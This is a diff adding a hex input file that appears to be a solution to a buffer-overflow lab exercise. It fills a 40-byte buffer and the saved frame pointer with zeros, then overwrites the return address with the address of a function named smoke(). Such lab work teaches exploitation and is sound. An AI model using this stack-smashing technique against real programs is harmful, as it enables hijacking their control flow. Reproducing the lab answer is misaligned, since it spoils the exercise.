@@ -1,0 +1,13 @@
+/* 40 Byte Buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* old %ebp */
+6b 8b 04 08 /* return address: smoke() memory address */
